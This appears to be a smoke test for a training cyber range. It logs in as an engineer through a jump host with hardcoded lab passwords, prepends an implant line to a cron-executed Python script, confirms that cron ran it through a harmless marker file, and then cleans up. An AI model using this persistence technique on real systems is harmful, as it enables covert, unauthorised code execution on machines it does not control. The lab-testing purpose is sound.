#!/usr/bin/env bash
# Persistence probe. The engineering workstation's plc-poll cron runs
# /opt/win10/C/Users/engineer/Tools/poll_and_ingest.py every minute as
# engineer, and the script is owned and writable by engineer. A visitor
# who lands as engineer (via the existing wizzards-retreat pivot) does not need
# root or a new cron entry: they just prepend a line to the existing
# script, and the cron daemon runs their payload on the next tick.
#
# Coverage:
#   Stage 1  baseline: engineer SSH via jump returns "engineer"
#   Stage 2  visitor prepends an implant line to poll_and_ingest.py
#   Stage 3  wait up to 75s for cron to fire; marker file appears
#   Stage 4  marker timestamp is recent (proves the implant ran, not stale)
#   Stage 5  cleanup: remove the implant line and the marker
#   Stage 6  poll_and_ingest.py is back to its original first line
#
# Usage: bash tests/smoke/test_persistence_cron_implant.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
JUMP_HOST="10.10.0.10"           # wizzards-retreat / wizzards-retreat
JUMP_USER="rincewind"
JUMP_PASS="wizzard"
TARGET_HOST="10.10.2.30"         # uupl-eng-ws, ops side
TARGET_USER="engineer"
TARGET_PASS="spanner99"
SCRIPT_PATH="/opt/win10/C/Users/engineer/Tools/poll_and_ingest.py"
MARKER="/tmp/uupl_persist_implant_marker"

require_running "$ATTACKER"
require_running "wizzards-retreat"
require_running "uupl-eng-ws"

# Helper: run a multi-line Python program on eng-ws via the wizzards-retreat jump,
# using the facade's `python -c "<code>"` path. The code is base64-encoded
# so newlines and quoting survive the SSH-shell-facade-python layers.
run_py_on_engws() {
    local code="$1"
    local b64
    b64="$(printf '%s' "$code" | base64 -w0)"
    local wrapper="import base64; exec(base64.b64decode('${b64}'))"
    ssh_password_login_via_jump "$ATTACKER" \
        "$JUMP_USER" "$JUMP_HOST" "$JUMP_PASS" \
        "$TARGET_USER" "$TARGET_HOST" "$TARGET_PASS" \
        "python -c \"$wrapper\""
}

echo "[persist-cron] Stage 1: baseline, engineer SSH via jump returns identity"
WHOAMI="$(ssh_password_login_via_jump "$ATTACKER" \
    "$JUMP_USER" "$JUMP_HOST" "$JUMP_PASS" \
    "$TARGET_USER" "$TARGET_HOST" "$TARGET_PASS" "whoami")"
assert_contains "$WHOAMI" "engineer" "engineer authenticates via wizzards-retreat jump"

echo "[persist-cron] Stage 2: visitor prepends implant line to poll_and_ingest.py"
INJECT_PY="$(cat <<'PYEOF'
p = '/opt/win10/C/Users/engineer/Tools/poll_and_ingest.py'
needle = '# uupl-implant-marker'
implant = (
    'import os, time; '
    'open("/tmp/uupl_persist_implant_marker", "w").write(str(int(time.time())))'
    '  ' + needle + '\n'
)
c = open(p).read()
if needle not in c:
    open(p, 'w').write(implant + c)
print('IMPLANTED' if needle in open(p).read() else 'MISS')
PYEOF
)"
INJECT_OUT="$(run_py_on_engws "$INJECT_PY")"
assert_contains "$INJECT_OUT" "IMPLANTED" "implant line prepended to poll_and_ingest.py"

echo "[persist-cron] Stage 3: wait for cron to fire (up to 75s)"
# Clear the marker first so we measure a fresh write.
run_py_on_engws "$(cat <<PYEOF
import os
if os.path.exists('$MARKER'):
    os.remove('$MARKER')
print('cleared')
PYEOF
)" >/dev/null
START_EPOCH=$(date +%s)
MARKER_FOUND=""
CHECK_PY="$(cat <<PYEOF
import os
print('PRESENT' if os.path.exists('$MARKER') else 'MISSING')
PYEOF
)"
for _ in $(seq 1 75); do
    CHECK="$(run_py_on_engws "$CHECK_PY")"
    if echo "$CHECK" | grep -q PRESENT; then
        MARKER_FOUND="yes"
        break
    fi
    sleep 1
done
[ -n "$MARKER_FOUND" ] || fail "marker file never appeared in 75s; cron may not be running the implant"
ok "marker file $MARKER appeared via cron tick"

echo "[persist-cron] Stage 4: marker timestamp is fresh"
READ_TS_PY="$(cat <<PYEOF
print(open('$MARKER').read().strip())
PYEOF
)"
TS="$(run_py_on_engws "$READ_TS_PY")"
TS="$(echo "$TS" | grep -oE '[0-9]+' | head -1)"
if [ -z "$TS" ]; then
    fail "marker file empty or unreadable"
else
    AGE=$((TS - START_EPOCH))
    if [ "$AGE" -ge -5 ] && [ "$AGE" -le 80 ]; then
        ok "marker timestamp $TS is within the test window (age ${AGE}s)"
    else
        fail "marker timestamp $TS outside expected window (age ${AGE}s)"
    fi
fi

echo "[persist-cron] Stage 5: cleanup, remove the implant and the marker"
CLEANUP_PY="$(cat <<'PYEOF'
import os
p = '/opt/win10/C/Users/engineer/Tools/poll_and_ingest.py'
needle = '# uupl-implant-marker'
lines = open(p).readlines()
lines = [l for l in lines if needle not in l]
open(p, 'w').writelines(lines)
if os.path.exists('/tmp/uupl_persist_implant_marker'):
    os.remove('/tmp/uupl_persist_implant_marker')
print('CLEANED')
PYEOF
)"
CLEAN_OUT="$(run_py_on_engws "$CLEANUP_PY")"
assert_contains "$CLEAN_OUT" "CLEANED" "implant removed and marker deleted"

echo "[persist-cron] Stage 6: poll_and_ingest.py restored"
FIRST_LINE_PY="$(cat <<PYEOF
print(open('$SCRIPT_PATH').readline().rstrip())
PYEOF
)"
FIRST_LINE="$(run_py_on_engws "$FIRST_LINE_PY")"
assert_contains "$FIRST_LINE" "#!/usr/bin/env python3" "first line is the original shebang"
assert_absent  "$FIRST_LINE" "uupl-implant-marker"      "implant line gone from top of file"

summary
